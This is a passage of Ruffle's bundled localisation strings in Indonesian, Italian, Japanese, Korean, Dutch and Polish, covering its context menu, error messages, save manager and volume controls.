Ruffle mengalami masalah besar ketika mencoba melakukan inisialisasi.\n    Hal ini sering kali dapat teratasi dengan sendirinya, sehingga Anda dapat mencoba memuat ulang halaman.\n    Jika tidak, silakan hubungi administrator situs web ini.\nerror-wasm-disabled-on-edge =\n    Ruffle gagal memuat komponen file ".wasm" yang diperlukan.\n    Untuk mengatasinya, coba buka pengaturan peramban Anda, klik "Privasi, pencarian, dan layanan", turun ke bawah, dan matikan "Tingkatkan keamanan Anda di web".\n    Ini akan memungkinkan browser Anda memuat file ".wasm" yang diperlukan.\n    Jika masalah berlanjut, Anda mungkin harus menggunakan browser yang berbeda.\nerror-javascript-conflict =\n    Ruffle mengalami masalah besar ketika mencoba melakukan inisialisasi.\n    Sepertinya situs web ini menggunakan kode JavaScript yang bertentangan dengan Ruffle.\n    Jika Anda adalah administrator server ini, kami mengajak Anda untuk mencoba memuat file pada halaman kosong.\nerror-javascript-conflict-outdated = Anda juga dapat mencoba mengunggah versi Ruffle yang lebih baru yang mungkin dapat mengatasi masalah ini (versi saat ini sudah kedaluwarsa: { $buildDate }).\nerror-csp-conflict =\n    Ruffle mengalami masalah besar ketika mencoba melakukan inisialisasi.\n    Kebijakan Keamanan Konten server web ini tidak mengizinkan komponen ".wasm" yang diperlukan untuk dijalankan.\n    Jika Anda adalah administrator server ini, silakan baca wiki Ruffle untuk mendapatkan bantuan.\nerror-unknown =\n    Ruffle telah mengalami masalah besar saat menampilkan konten Flash ini.\n    { $outdated ->\n        [true] Jika Anda administrator server ini, cobalah untuk mengganti versi Ruffle yang lebih baru (versi saat ini sudah kedaluwarsa: { $buildDate }).\n       *[false] Hal ini seharusnya tidak terjadi, jadi kami sangat menghargai jika Anda dapat melaporkan bug ini!\n    }\n', "save-manager.ftl": "save-delete-prompt = Anda yakin ingin menghapus berkas ini?\nsave-reload-prompt =\n    Satu-satunya cara untuk { $action ->\n        [delete] menghapus\n       *[replace] mengganti\n    } berkas penyimpanan ini tanpa potensi konflik adalah dengan memuat ulang konten ini. Apakah Anda ingin melanjutkannya?\nsave-download = Unduh\nsave-replace = Ganti\nsave-delete = Hapus\nsave-backup-all = Unduh semua berkas penyimpanan\n", "volume-controls.ftl": "volume-controls = Pengaturan Volume\nvolume-controls-mute = Bisukan\nvolume-controls-volume = Volume\n"}, "it-IT": {"context_menu.ftl": "context-menu-download-swf = Scarica .swf\ncontext-menu-copy-debug-info = Copia informazioni di debug\ncontext-menu-open-save-manager = Apri Gestione salvataggi\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Informazioni su Ruffle Extension ({ $version })\n       *[other] Informazioni su Ruffle ({ $version })\n    }\ncontext-menu-hide = Nascondi questo menu\ncontext-menu-exit-fullscreen = Esci dallo schermo intero\ncontext-menu-enter-fullscreen = Entra a schermo intero\ncontext-menu-volume-controls = Controlli volume\n", "messages.ftl": "message-cant-embed =\n    Ruffle non è stato in grado di eseguire il Flash incorporato in questa pagina.\n    Puoi provare ad aprire il file in una scheda separata, per evitare questo problema.\npanic-title = Qualcosa è andato storto :(\nmore-info = Maggiori informazioni\nrun-anyway = Esegui comunque\ncontinue = Continua\nreport-bug = Segnala Un Bug\nupdate-ruffle = Aggiorna Ruffle\nruffle-demo = Demo Web\nruffle-desktop = Applicazione Desktop\nruffle-wiki = Visualizza Ruffle Wiki\nenable-hardware-acceleration = Sembra che l'accelerazione hardware non sia abilitata. Sebbene Ruffle possa funzionare, potrebbe essere irragionevolmente lento. Puoi scoprire come abilitare l'accelerazione hardware seguendo questo collegamento.\nview-error-details = Visualizza Dettagli Errore\nopen-in-new-tab = Apri in una nuova scheda\nclick-to-unmute = Clicca per riattivare l'audio\nerror-file-protocol =\n    Sembra che tu stia eseguendo Ruffle sul protocollo \"file:\".\n    Questo non funziona come browser blocca molte funzionalità di lavoro per motivi di sicurezza.\n    Invece, ti invitiamo a configurare un server locale o a utilizzare la demo web o l'applicazione desktop.\nerror-javascript-config =\n    Ruffle ha incontrato un problema importante a causa di una configurazione JavaScript non corretta.\n    Se sei l'amministratore del server, ti invitiamo a controllare i dettagli dell'errore per scoprire quale parametro è in errore.\n    Puoi anche consultare il wiki Ruffle per aiuto.\nerror-wasm-not-found =\n    Ruffle non è riuscito a caricare il componente di file \".wasm\".\n    Se sei l'amministratore del server, assicurati che il file sia stato caricato correttamente.\n    Se il problema persiste, potrebbe essere necessario utilizzare l'impostazione \"publicPath\": si prega di consultare il wiki Ruffle per aiuto.\nerror-wasm-mime-type =\n    Ruffle ha incontrato un problema importante durante il tentativo di inizializzazione.\n    Questo server web non serve \". asm\" file con il tipo MIME corretto.\n    Se sei l'amministratore del server, consulta la wiki Ruffle per aiuto.\nerror-swf-fetch =\n    Ruffle non è riuscito a caricare il file Flash SWF.\n    La ragione più probabile è che il file non esiste più, quindi non c'è nulla che Ruffle possa caricare.\n    Prova a contattare l'amministratore del sito web per aiuto.\nerror-swf-cors =\n    Ruffle non è riuscito a caricare il file SWF Flash.\n    L'accesso al recupero probabilmente è stato bloccato dalla politica CORS.\n    Se sei l'amministratore del server, consulta la wiki Ruffle per ricevere aiuto.\nerror-wasm-cors =\n    Ruffle non è riuscito a caricare il componente di file \".wasm\".\n    L'accesso al recupero probabilmente è stato bloccato dalla politica CORS.\n    Se sei l'amministratore del server, consulta la wiki Ruffle per ricevere aiuto.\nerror-wasm-invalid =\n    Ruffle ha incontrato un problema importante durante il tentativo di inizializzazione.\n    Sembra che questa pagina abbia file mancanti o non validi per l'esecuzione di Ruffle.\n    Se sei l'amministratore del server, consulta la wiki Ruffle per ricevere aiuto.\nerror-wasm-download =\n    Ruffle ha incontrato un problema importante durante il tentativo di inizializzazione.\n    Questo può spesso risolversi da solo, quindi puoi provare a ricaricare la pagina.\n    Altrimenti, contatta l'amministratore del sito.\nerror-wasm-disabled-on-edge =\n    Ruffle non ha caricato il componente di file \".wasm\" richiesto.\n    Per risolvere il problema, prova ad aprire le impostazioni del tuo browser, facendo clic su \"Privacy, search, and services\", scorrendo verso il basso e disattivando \"Migliora la tua sicurezza sul web\".\n    Questo permetterà al tuo browser di caricare i file \".wasm\" richiesti.\n    Se il problema persiste, potresti dover usare un browser diverso.\nerror-javascript-conflict =\n    Ruffle ha riscontrato un problema importante durante il tentativo di inizializzazione.\n    Sembra che questa pagina utilizzi il codice JavaScript che è in conflitto con Ruffle.\n    Se sei l'amministratore del server, ti invitiamo a provare a caricare il file su una pagina vuota.\nerror-javascript-conflict-outdated = Puoi anche provare a caricare una versione più recente di Ruffle che potrebbe aggirare il problema (l'attuale build è obsoleta: { $buildDate }).\nerror-csp-conflict =\n    Ruffle ha incontrato un problema importante durante il tentativo di inizializzare.\n    La Politica di Sicurezza dei Contenuti di questo server web non consente l'impostazione richiesta\". asm\" componente da eseguire.\n    Se sei l'amministratore del server, consulta la Ruffle wiki per aiuto.\nerror-unknown =\n    Ruffle ha incontrato un problema importante durante il tentativo di visualizzare questo contenuto Flash.\n    { $outdated ->\n        [true] Se sei l'amministratore del server, prova a caricare una versione più recente di Ruffle (la versione attuale è obsoleta: { $buildDate }).\n       *[false] Questo non dovrebbe accadere, quindi ci piacerebbe molto se si potesse inviare un bug!\n    }\n", "save-manager.ftl": "save-delete-prompt = Sei sicuro di voler eliminare questo file di salvataggio?\nsave-reload-prompt =\n    L'unico modo per { $action ->\n        [delete] delete\n       *[replace] replace\n    } questo salvataggio file senza potenziali conflitti è quello di ricaricare questo contenuto. Volete continuare comunque?\nsave-download = Scarica\nsave-replace = Sostituisci\nsave-delete = Elimina\nsave-backup-all = Scarica tutti i file di salvataggio\n", "volume-controls.ftl": "volume-controls = Controlli volume\nvolume-controls-mute = Silenzia\nvolume-controls-volume = Volume\n"}, "ja-JP": {"context_menu.ftl": "context-menu-download-swf = .swfをダウンロード\ncontext-menu-copy-debug-info = デバッグ情報をコピー\ncontext-menu-open-save-manager = セーブマネージャーを開く\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Ruffle拡張機能について ({ $version })\n       *[other] Ruffleについて ({ $version })\n    }\ncontext-menu-hide = メニューを隠す\ncontext-menu-exit-fullscreen = フルスクリーンを終了\ncontext-menu-enter-fullscreen = フルスクリーンにする\ncontext-menu-volume-controls = 音量\n", "messages.ftl": 'message-cant-embed =\n    Ruffleはこのページに埋め込まれた Flash を実行できませんでした。\n    別のタブでファイルを開くことで、この問題を解決できるかもしれません。\npanic-title = エラーが発生しました :(\nmore-info = 詳細情報\nrun-anyway = とにかく実行する\ncontinue = 続行\nreport-bug = バグを報告\nupdate-ruffle = Ruffleを更新\nruffle-demo = Webデモ\nruffle-desktop = デスクトップアプリケーション\nruffle-wiki = Ruffle Wikiを表示\nenable-hardware-acceleration = ハードウェアアクセラレーションが有効になっていないようです。Ruffleが動作しないか、動作が遅くなる可能性があります。 ハードウェアアクセラレーションを有効にする方法については、こちらのリンクを参照してください。\nview-error-details = エラーの詳細を表示\nopen-in-new-tab = 新しいタブで開く\nclick-to-unmute = クリックでミュートを解除\nerror-file-protocol =\n    Ruffleを"file:"プロトコルで使用しているようです。\n    ブラウザはセキュリティ上の理由から殆どの機能を制限しているため、正しく動作しません。\n    ローカルサーバーをセットアップするか、ウェブデモまたはデスクトップアプリをご利用ください。\nerror-javascript-config =\n    JavaScriptの設定が正しくないため、Ruffleで問題が発生しました。\n    サーバー管理者の方は、エラーの詳細から、どのパラメーターに問題があるのかを確認してください。\n    Ruffleのwikiを参照することで、解決方法が見つかるかもしれません。\nerror-wasm-not-found =\n    Ruffleの初期化時に重大な問題が発生しました。\n    このWebサーバーのコンテンツセキュリティポリシーが、実行に必要となる「.wasm」コンポーネントの実行を許可していません。サーバーの管理者の場合は、ファイルが正しくアップロードされているか確認をしてください。この問題が解決しない場合は、「publicPath」の設定を使用する必要があります。\n    サーバーの管理者は、Ruffleのwikiを参照してください。\nerror-wasm-mime-type =\n    Ruffleの初期化に失敗する大きな問題が発生しました。\n    このWebサーバーは正しいMIMEタイプの「.wasm」ファイルを提供していません。\n    サーバーの管理者は、Ruffleのwikiを参照してください。\nerror-swf-fetch =\n    RuffleがFlash SWFファイルの読み込みに失敗しました。\n    最も考えられる原因は、SWFファイルが既に存在しない事でRuffleが読み込みに失敗するという問題です。\n    Webサイトの管理者にお問い合わせください。\nerror-swf-cors =\n    RuffleはSWFファイルの読み込みに失敗しました。\n    CORSポリシーの設定により、fetchへのアクセスがブロックされている可能性があります。\n    サーバー管理者の方は、Ruffleのwikiを参照してください。\nerror-wasm-cors =\n    Ruffleに必要となる「.wasm」ファイルコンポーネントの読み込みに失敗しました。\n    CORSポリシーによってfetchへのアクセスがブロックされている可能性があります。\n    サーバーの管理者は、Ruffle wikiを参照してください。\nerror-wasm-invalid =\n    Ruffleの初期化時に重大な問題が発生しました。\n    このページにはRuffleを実行するためのファイルが存在しないか、無効なファイルがあるかもしれません。\n    サーバーの管理者は、Ruffleのwikiを参照してください。\nerror-wasm-download =\n    Ruffleの初期化時に重大な問題が発生しました。\n    この問題はページを再読み込みする事で大抵は解決するはずなので行なってみてください。\n    もしも解決しない場合は、Webサイトの管理者にお問い合わせください。\nerror-wasm-disabled-on-edge =\n    Ruffleに必要となる「.wasm」ファイルコンポーネントの読み込みに失敗しました。\n    この問題を解決するにはブラウザーの設定を開き、「プライバシー、検索、サービス」をクリックし、下にスクロールで「Web上のセキュリティを強化する」をオフにしてみてください。\n    これで必要となる「.wasm」ファイルが読み込まれるようになります。\n    それでも問題が解決しない場合、別のブラウザーを使用する必要があるかもしれません。\nerror-javascript-conflict =\n    Ruffleの初期化時に重大な問題が発生しました。\n    このページではRuffleと競合するJavaScriptコードが使用されているかもしれません。\n    サーバーの管理者は、空白のページでファイルを読み込みし直してみてください。\nerror-javascript-conflict-outdated = 新しいバージョンのRuffleをアップロードすることで、この問題を回避できる可能性があります。(現在のビルドは古い物です:{ $buildDate })\nerror-csp-conflict =\n    Ruffleの初期化時に重大な問題が発生しました。\n    このWebサーバーのコンテンツセキュリティポリシーが実行に必要となる「.wasm」コンポーネントの実行を許可していません。\n    サーバーの管理者は、Ruffleのwikiを参照してください。\nerror-unknown =\n    Flashコンテンツを表示する際にRuffleで問題が発生しました。\n    { $outdated ->\n        [true] 現在使用しているビルドは最新ではないため、サーバー管理者の方は、最新版のRuffleに更新してみてください(現在利用中のビルド: { $buildDate })。\n       *[false] 想定外の問題なので、バグとして報告していただけると嬉しいです!\n    }\n', "save-manager.ftl": "save-delete-prompt = このセーブファイルを削除してもよろしいですか?\nsave-reload-prompt =\n    セーブファイルを競合の可能性なく { $action ->\n        [delete] 削除する\n       *[replace] 置き換える\n    } ために、このコンテンツを再読み込みすることを推奨します。続行しますか？\nsave-download = ダウンロード\nsave-replace = 置き換え\nsave-delete = 削除\nsave-backup-all = すべてのセーブファイルをダウンロード\n", "volume-controls.ftl": "volume-controls = 音量\nvolume-controls-mute = 消音\nvolume-controls-volume = 音量\n"}, "ko-KR": {"context_menu.ftl": "context-menu-download-swf = .swf 다운로드\ncontext-menu-copy-debug-info = 디버그 정보 복사\ncontext-menu-open-save-manager = 저장 관리자 열기\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Ruffle 확장 프로그램 정보 ({ $version })\n       *[other] Ruffle 정보 ({ $version })\n    }\ncontext-menu-hide = 이 메뉴 숨기기\ncontext-menu-exit-fullscreen = 전체화면 나가기\ncontext-menu-enter-fullscreen = 전체화면으로 열기\ncontext-menu-volume-controls = 음량 조절\n", "messages.ftl": 'message-cant-embed = Ruffle이 이 페이지에 포함된 플래시를 실행할 수 없었습니다. 별도의 탭에서 파일을 열어봄으로서 이 문제를 해결할 수 있습니다.\npanic-title = 문제가 발생했습니다 :(\nmore-info = 추가 정보\nrun-anyway = 그래도 실행하기\ncontinue = 계속하기\nreport-bug = 버그 제보\nupdate-ruffle = Ruffle 업데이트\nruffle-demo = 웹 데모\nruffle-desktop = 데스크톱 애플리케이션\nruffle-wiki = Ruffle 위키 보기\nenable-hardware-acceleration = 하드웨어 가속이 활성화되지 않은 것 같습니다. Ruffle은 계속 작동하지만 실행 속도가 매우 느릴 수 있습니다. 하드웨어 가속을 활성화하는 방법을 알아보려면 다음 링크를 참고해보세요.\nview-error-details = 오류 세부 정보 보기\nopen-in-new-tab = 새 탭에서 열기\nclick-to-unmute = 클릭하여 음소거 해제\nerror-file-protocol =\n    Ruffle을 "file:" 프로토콜에서 실행하고 있는 것으로 보입니다.\n    브라우저에서는 이 프로토콜을 보안상의 이유로 많은 기능을 작동하지 않게 차단하므로 이 방법은 작동하지 않습니다.\n    대신, 로컬 서버를 직접 열어서 설정하거나 웹 데모 또는 데스크톱 애플리케이션을 사용하시기 바랍니다.\nerror-javascript-config =\n    잘못된 자바스크립트 설정으로 인해 Ruffle에서 중대한 문제가 발생했습니다.\n    만약 당신이 서버 관리자인 경우, 오류 세부사항을 확인하여 어떤 매개변수가 잘못되었는지 알아보세요.\n    또는 Ruffle 위키를 통해 도움을 받아 볼 수도 있습니다.\nerror-wasm-not-found =\n    Ruffle이 ".wasm" 필수 파일 구성요소를 로드하지 못했습니다.\n    만약 당신이 서버 관리자라면 파일이 올바르게 업로드되었는지 확인하세요.\n    문제가 지속된다면 "publicPath" 옵션을 사용해야 할 수도 있습니다: Ruffle 위키를 참조하여 도움을 받으세요.\nerror-wasm-mime-type =\n    Ruffle이 초기화를 시도하는 동안 중대한 문제가 발생했습니다.\n    이 웹 서버는 올바른 MIME 유형의 ".wasm" 파일을 제공하지 않습니다.\n    만약 당신이 서버 관리자라면 Ruffle 위키를 통해 도움을 받으세요.\nerror-swf-fetch =\n    Ruffle이 플래시 SWF 파일을 로드하는 데 실패하였습니다.\n    이는 주로 파일이 더 이상 존재하지 않아 Ruffle이 로드할 수 있는 것이 없을 가능성이 높습니다.\n    웹사이트 관리자에게 문의하여 도움을 받아보세요.\nerror-swf-cors =\n    Ruffle이 플래시 SWF 파일을 로드하는 데 실패하였습니다.\n    CORS 정책에 의해 데이터 가져오기에 대한 액세스가 차단되었을 수 있습니다.\n    만약 당신이 서버 관리자라면 Ruffle 위키를 참조하여 도움을 받아볼 수 있습니다.\nerror-wasm-cors =\n    Ruffle이 ".wasm" 필수 파일 구성요소를 로드하지 못했습니다.\n    CORS 정책에 의해 데이터 가져오기에 대한 액세스가 차단되었을 수 있습니다.\n    만약 당신이 서버 관리자라면 Ruffle 위키를 참조하여 도움을 받아볼 수 있습니다.\nerror-wasm-invalid =\n    Ruffle이 초기화를 시도하는 동안 중대한 문제가 발생했습니다.\n    이 페이지에 Ruffle을 실행하기 위한 파일이 누락되었거나 잘못된 것 같습니다.\n    만약 당신이 서버 관리자라면 Ruffle 위키를 참조하여 도움을 받아볼 수 있습니다.\nerror-wasm-download =\n    Ruffle이 초기화를 시도하는 동안 중대한 문제가 발생했습니다.\n    이 문제는 때때로 바로 해결될 수 있으므로 페이지를 새로고침하여 다시 시도해보세요.\n    그래도 문제가 지속된다면, 웹사이트 관리자에게 문의해주세요.\nerror-wasm-disabled-on-edge =\n    Ruffle이 ".wasm" 필수 파일 구성요소를 로드하지 못했습니다.\n    이를 해결하려면 브라우저 설정에서 "개인 정보, 검색 및 서비스"를 클릭한 후, 하단으로 스크롤하여 "웹에서 보안 강화" 기능을 꺼야 합니다.\n    이는 필요한 ".wasm" 파일을 브라우저에서 로드할 수 있도록 허용합니다.\n    이 문제가 지속될 경우 다른 브라우저를 사용해야 할 수 있습니다.\nerror-javascript-conflict =\n    Ruffle이 초기화를 시도하는 동안 중대한 문제가 발생했습니다.\n    이 페이지에서 사용되는 자바스크립트 코드가 Ruffle과 충돌하는 것으로 보입니다.\n    만약 당신이 서버 관리자라면 빈 페이지에서 파일을 로드해보세요.\nerror-javascript-conflict-outdated = 또한 Ruffle의 최신 버전을 업로드하는 것을 시도하여 문제를 우회해볼 수 있습니다. (현재 빌드가 오래되었습니다: { $buildDate }).\nerror-csp-conflict =\n    Ruffle이 초기화를 시도하는 동안 중대한 문제가 발생했습니다.\n    이 웹 서버의 CSP(Content Security Policy) 정책이 ".wasm" 필수 구성요소를 실행하는 것을 허용하지 않습니다.\n    만약 당신이 서버 관리자라면 Ruffle 위키를 참조하여 도움을 받아볼 수 있습니다.\nerror-unknown =\n    Ruffle이 플래시 콘텐츠를 표시하려고 시도하는 동안 중대한 문제가 발생했습니다.\n    { $outdated ->\n        [true] 만약 당신이 서버 관리자라면, Ruffle의 최신 버전을 업로드하여 다시 시도해보세요. (현재 빌드가 오래되었습니다: { $buildDate }).\n       *[false] 이런 현상이 발생해서는 안되므로, 버그를 제보해주신다면 감사하겠습니다!\n    }\n', "save-manager.ftl": "save-delete-prompt = 정말로 이 세이브 파일을 삭제하시겠습니까?\nsave-reload-prompt =\n    이 파일을 잠재적인 충돌 없이 { $action ->\n        [delete] 삭제\n       *[replace] 교체\n    }하려면 콘텐츠를 다시 로드해야 합니다. 그래도 계속하시겠습니까?\nsave-download = 다운로드\nsave-replace = 교체\nsave-delete = 삭제\nsave-backup-all = 모든 저장 파일 다운로드\n", "volume-controls.ftl": "volume-controls = 음량 조절\nvolume-controls-mute = 음소거\nvolume-controls-volume = 음량\n"}, "nl-NL": {"context_menu.ftl": "context-menu-download-swf = .swf downloaden\ncontext-menu-copy-debug-info = Kopieer debuginformatie\ncontext-menu-open-save-manager = Open opgeslagen-data-manager\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Over Ruffle Uitbreiding ({ $version })\n       *[other] Over Ruffle ({ $version })\n    }\ncontext-menu-hide = Verberg dit menu\ncontext-menu-exit-fullscreen = Verlaat volledig scherm\ncontext-menu-enter-fullscreen = Naar volledig scherm\ncontext-menu-volume-controls = Geluidsniveaus\n", "messages.ftl": 'message-cant-embed =\n    Ruffle kon de Flash-inhoud op de pagina niet draaien.\n    Je kan proberen het bestand in een apart tabblad te openen, om hier omheen te werken.\npanic-title = Er ging iets mis :(\nmore-info = Meer informatie\nrun-anyway = Toch starten\ncontinue = Doorgaan\nreport-bug = Bug rapporteren\nupdate-ruffle = Ruffle updaten\nruffle-demo = Web Demo\nruffle-desktop = Desktopapplicatie\nruffle-wiki = Bekijk de Ruffle Wiki\nenable-hardware-acceleration = Het lijkt erop dat hardwareversnelling niet beschikbaar is. Ruffle zal werken, maar gaat waarschijnlijk erg traag zijn. Je kan lezen hoe hardwareversnelling in te schakelen is door deze link te volgen.\nview-error-details = Foutdetails tonen\nopen-in-new-tab = Openen in een nieuw tabblad\nclick-to-unmute = Klik om te ontdempen\nerror-file-protocol =\n    Het lijkt erop dat je Ruffle gebruikt met het "file" protocol.\n    De meeste browsers blokkeren dit om veiligheidsredenen, waardoor het niet werkt.\n    In plaats hiervan raden we aan om een lokale server te draaien, de web demo te gebruiken, of de desktopapplicatie.\nerror-javascript-config =\n    Ruffle heeft een groot probleem ondervonden vanwege een onjuiste JavaScript configuratie.\n    Als je de serverbeheerder bent, kijk dan naar de foutdetails om te zien wat er verkeerd is.\n    Je kan ook in de Ruffle wiki kijken voor hulp.\nerror-wasm-not-found =\n    Ruffle kon het vereiste ".wasm" bestandscomponent niet laden.\n    Als je de serverbeheerder bent, controleer dan of het bestaand juist is geüpload.\n    Mocht het probleem blijven voordoen, moet je misschien de "publicPath" instelling gebruiken: zie ook de Ruffle wiki voor hulp.\nerror-wasm-mime-type =\n    Ruffle heeft een groot probleem ondervonden tijdens het initialiseren.\n    Deze webserver serveert ".wasm" bestanden niet met het juiste MIME type.\n    Als je de serverbeheerder bent, kijk dan in de Ruffle wiki voor hulp.\nerror-swf-fetch =\n    Ruffle kon het Flash SWF bestand niet inladen.\n    De meest waarschijnlijke reden is dat het bestand niet langer bestaat, en er dus niets is om in te laden.\n    Probeer contact op te nemen met de websitebeheerder voor hulp.\nerror-swf-cors =\n    Ruffle kon het Flash SWD bestand niet inladen.\n    Toegang is waarschijnlijk geblokeerd door het CORS beleid.\n    Als je de serverbeheerder bent, kijk dan in de Ruffle wiki voor hulp.\nerror-wasm-cors =\n    Ruffle kon het vereiste ".wasm" bestandscomponent niet laden.\n    Toegang is waarschijnlijk geblokeerd door het CORS beleid.\n    Als je de serverbeheerder bent, kijk dan in de Ruffle wiki voor hulp.\nerror-wasm-invalid =\n    Ruffle heeft een groot probleem ondervonden tijdens het initialiseren.\n    Het lijkt erop dat de Ruffle bestanden ontbreken of ongeldig zijn.\n    Als je de serverbeheerder bent, kijk dan in de Ruffle wiki voor hulp.\nerror-wasm-download =\n    Ruffle heeft een groot probleem ondervonden tijdens het initialiseren.\n    Dit lost zichzelf vaak op als je de bladzijde opnieuw inlaadt.\n    Zo niet, neem dan contact op met de websitebeheerder.\nerror-wasm-disabled-on-edge =\n    Ruffle kon het vereiste ".wasm" bestandscomponent niet laden.\n    Om dit op te lossen, ga naar je browserinstellingen, klik op "Privacy, zoeken en diensten", scroll omlaag, en schakel "Verbeter je veiligheid op he web" uit.\n    Dan kan je browser wel de vereiste ".wasm" bestanden inladen.\n    Als het probleem zich blijft voordoen, moet je misschien een andere browser gebruiken.\nerror-javascript-conflict =\n    Ruffle heeft een groot probleem ondervonden tijdens het initialiseren.\n    Het lijkt erop dat deze pagina JavaScript code gebruikt die conflicteert met Ruffle.\n    Als je de serverbeheerder bent, raden we aan om het bestand op een lege pagina te proberen in te laden.\nerror-javascript-conflict-outdated = Je kan ook proberen een nieuwe versie van Ruffle te installeren, om om het probleem heen te werken (huidige versie is oud: { $buildDate }).\nerror-csp-conflict =\n    Ruffle heeft een groot probleem ondervonden tijdens het initialiseren.\n    Het CSP-beleid staat niet toe dat het vereiste ".wasm" component kan draaien.\n    Als je de serverbeheerder bent, kijk dan in de Ruffle wiki voor hulp.\nerror-unknown =\n    Ruffle heeft een groot probleem onderbonden tijdens het weergeven van deze Flash-inhoud.\n    { $outdated ->\n        [true] Als je de serverbeheerder bent, upload dan een nieuwe versie van Ruffle (huidige versie is oud: { $buildDate }).\n       *[false] Dit hoort niet te gebeuren, dus we stellen het op prijs als je de fout aan ons rapporteert!\n    }\n', "save-manager.ftl": "save-delete-prompt = Weet je zeker dat je deze opgeslagen data wilt verwijderen?\nsave-reload-prompt =\n    De enige manier om deze opgeslagen data te { $action ->\n        [delete] verwijderen\n       *[replace] vervangen\n    } zonder potentiële problemen is door de inhoud opnieuw te laden. Toch doorgaan?\nsave-download = Downloaden\nsave-replace = Vervangen\nsave-delete = Verwijderen\nsave-backup-all = Download alle opgeslagen data\n", "volume-controls.ftl": "volume-controls = Geluidsniveaus\nvolume-controls-mute = Dempen\nvolume-controls-volume = Volume\n"}, "pl-PL": {"context_menu.ftl": "context-menu-download-swf = Pobierz .swf\ncontext-menu-copy-debug-info = Kopiuj informacje debugowania\ncontext-menu-open-save-manager = Otwórz Menadżer Zapisów\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] O Rozszerzeniu Ruffle ({ $version })\n       *[other] O Ruffle ({ $version })\n    }\ncontext-menu-hide = Ukryj to menu\ncontext-menu-exit-fullscreen = Zamknij pełny ekran\ncontext-menu-enter-fullscreen = Pełny ekran\ncontext-menu-volume-controls = Sterowanie głośnością\n", "messages.ftl": 'message-cant-embed =\n    Ruffle nie było w stanie uruchomić zawartości Flash w tej stronie.\n    Możesz spróbować otworzyć plik w nowej karcie, aby uniknąć tego problemu.\npanic-title = Coś poszło nie tak :(\nmore-info = Więcej informacji\nrun-anyway = Uruchom mimo tego\ncontinue = Kontynuuj\nreport-bug = Zgłoś błąd\nupdate-ruffle = Zaktualizuj Ruffle\nruffle-desktop = Aplikacja na komputer\nruffle-wiki = Zobacz Wiki Ruffle\nenable-hardware-acceleration = Wygląda na to, że akceleracja sprzętowa nie jest włączona. Chociaż Ruffle może działać, może być nieproporcjonalnie wolna. Możesz dowiedzieć się, jak włączyć akcelerację sprzętową, podążając za tym linkiem.\nview-error-details = Zobacz szczegóły błędu\nopen-in-new-tab = Otwórz w nowej karcie\nclick-to-unmute = Kliknij aby wyłączyć wyciszenie\nerror-file-protocol =\n    Wygląda na to, że używasz Ruffle w protokole "plik:".\n    To nie działa ponieważ przeglądarka blokuje wiele funkcji przed działaniem ze względów bezpieczeństwa.\n    Zamiast tego zapraszamy do konfiguracji serwera lokalnego lub użycia aplikacji demo lub desktopowej.\nerror-javascript-config =\n    Ruffle napotkał poważny problem z powodu nieprawidłowej konfiguracji JavaScript.\n    Jeśli jesteś administratorem serwera, prosimy o sprawdzenie szczegółów błędu, aby dowiedzieć się, który parametr jest błędny.\n    Możesz również zapoznać się z wiki Ruffle po pomoc.\nerror-wasm-not-found =\n    Ruffle nie udało się załadować wymaganego komponentu pliku ".wasm".\n    Jeśli jesteś administratorem serwera, upewnij się, że plik został poprawnie przesłany.\n    Jeśli problem będzie się powtarzał, być może będziesz musiał użyć ustawienia "publicPath": zapoznaj się z wiki Ruffle aby uzyskać pomoc.\nerror-wasm-mime-type =\n    Ruffle napotkał poważny problem podczas próby zainicjowania.\n    Ten serwer internetowy nie obsługuje ". asm" pliki z poprawnym typem MIME.\n    Jeśli jesteś administratorem serwera, zapoznaj się z wiki Ruffle aby uzyskać pomoc.\nerror-swf-fetch =\n    Ruffle nie udało się załadować pliku Flash SWF.\n    Najbardziej prawdopodobnym powodem jest to, że plik już nie istnieje, więc Ruffle nie ma nic do załadowania.\n    Spróbuj skontaktować się z administratorem witryny, aby uzyskać pomoc.\nerror-swf-cors =\n    Ruffle nie udało się załadować pliku Flash SWF.\n    Dostęp do pobierania został prawdopodobnie zablokowany przez politykę CORS.\n    Jeśli jesteś administratorem serwera, prosimy o pomoc z wiki Ruffle.\nerror-wasm-cors =\n    Ruffle nie udało się załadować wymaganego komponentu pliku ".wasm".\n    Dostęp do pobierania został prawdopodobnie zablokowany przez politykę CORS.\n    Jeśli jesteś administratorem serwera, prosimy o pomoc z wiki Ruffle.\nerror-wasm-invalid =\n    Ruffle napotkał poważny problem podczas próby zainicjowania.\n    Wygląda na to, że ta strona ma brakujące lub nieprawidłowe pliki do uruchomienia Ruffle.\n    Jeśli jesteś administratorem serwera, prosimy o pomoc z wiki Ruffle.\nerror-wasm-download =\n    Ruffle napotkał poważny problem podczas próby zainicjowania.\n    Może to często rozwiązać siebie, więc możesz spróbować odświeżyć stronę.\n    W przeciwnym razie skontaktuj się z administratorem witryny.\nerror-wasm-disabled-on-edge =\n    Ruffle nie udało się załadować wymaganego komponentu pliku ".wasm".\n    Aby to naprawić, spróbuj otworzyć ustawienia przeglądarki, klikając "Prywatność, wyszukiwanie i usługi", przewijając w dół i wyłączając "Zwiększ bezpieczeństwo w sieci".\n    Pozwoli to przeglądarce załadować wymagane pliki ".wasm".\n    Jeśli problem będzie się powtarzał, być może będziesz musiał użyć innej przeglądarki.\nerror-javascript-conflict =\n    Ruffle napotkał poważny problem podczas próby zainicjowania.\n    Wygląda na to, że ta strona używa kodu JavaScript, który koliduje z Ruffle.\n    Jeśli jesteś administratorem serwera, zapraszamy Cię do ładowania pliku na pustej stronie.\nerror-javascript-conflict-outdated = Możesz również spróbować przesłać nowszą wersję Ruffle, która może ominąć problem (obecna wersja jest przestarzała: { $buildDate }).\nerror-csp-conflict =\n    Ruffle napotkał poważny problem podczas próby zainicjowania.\n    Polityka bezpieczeństwa zawartości tego serwera nie zezwala na wymagany ". wasm" komponent do uruchomienia.\n    Jeśli jesteś administratorem serwera, zapoznaj się z wiki Ruffle po pomoc.\nerror-unknown =\n    Ruffle napotkał poważny problem podczas próby wyświetlenia tej zawartości Flash.\n    { $outdated ->\n        [true] Jeśli jesteś administratorem serwera, spróbuj przesłać nowszą wersję Ruffle (obecna wersja jest przestarzała: { $buildDate }).\n       *[false] To nie powinno się wydarzyć, więc bylibyśmy wdzięczni, gdybyś mógł zgłosić błąd!\n    }\n', 